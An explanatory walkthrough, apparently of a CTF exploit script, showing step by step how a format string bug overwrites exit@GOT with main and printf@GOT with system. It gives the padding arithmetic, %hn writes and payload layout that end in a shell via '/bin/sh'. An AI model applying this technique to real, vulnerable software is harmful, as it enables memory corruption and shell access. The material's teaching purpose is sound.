🧠 What this script is trying to do (simple)

It abuses a format string bug to:

Keep the program running (exit → main)
Turn printf into system
Then run:
/bin/sh
🔧 Focus on ONE call

Let’s zoom into this line:

fmt_write_2bytes(EXIT_GOT, MAIN)
Values:
EXIT_GOT = 0x080497e0
MAIN     = 0x08048444
🧩 Step 1 — Split MAIN
lo = 0x8444   # lower 16 bits
hi = 0x0804   # upper 16 bits

👉 In decimal:

lo = 33860
hi = 2052
⚠️ Important observation
lo > hi

So we go into the else branch

🧩 Step 2 — Addresses
a_lo = pack(0x080497e0)
a_hi = pack(0x080497e2)

Memory layout:

0x080497e0 → lower 2 bytes
0x080497e2 → upper 2 bytes

But since lo > hi, we reverse:

head = a_hi + a_lo

So memory order becomes:

[ addr+2 ][ addr ]
🎯 Step 3 — Compute padding
p1 = (hi - 8)      = 2052 - 8   = 2044
p2 = (lo - hi)     = 33860-2052 = 31808
🧾 Final format string (conceptually)
[addr+2][addr] + %2044x%10$hn + %31808x%11$hn
🎬 FULL EXECUTION VISUALIZATION
🟢 Initial state
Printed bytes = 8   (because of the two addresses)
🔵 Step 1 — %2044x
Print 2044 characters
Counter: 8 → 2052
🟡 Step 2 — %10$hn
Write 2052 (0x0804) → address (addr+2)

Memory now:

0x080497e2 → 0x0804   ✅ (HI written)
🔵 Step 3 — %31808x
Print 31808 more characters
Counter: 2052 → 33860
🟡 Step 4 — %11$hn
Write 33860 (0x8444) → address (addr)

Memory now:

0x080497e0 → 0x8444   ✅ (LO written)
🧠 Final memory result

Combine both halves:

[0x080497e0] = 0x8444
[0x080497e2] = 0x0804

➡️ Together:

0x08048444  (MAIN)

✅ You successfully overwrote exit@GOT with main

📊 Visual timeline
START: counter = 8

   ↓ print 2044 chars
counter = 2052  ───────► write HI (0x0804)

   ↓ print 31808 chars
counter = 33860 ───────► write LO (0x8444)
🔁 Same logic for Stage 2
fmt_write_2bytes(PRINTF_GOT, SYSTEM)

You repeat the exact same trick, but now writing:

printf → system
💥 Final step
print "/bin/sh"

Now when the program does:

printf("/bin/sh")

It actually becomes:

system("/bin/sh")
🧠 Big picture (clean mental model)
1. Put addresses on stack
2. Carefully increase printed character count
3. Use %hn to write that count into memory
4. Do it twice (low + high)
🔥 Why the if/else exists (final clarity)

Because:

You can only count UP

So:

write smaller value first
then larger value

Otherwise you'd need to "go backwards" (impossible)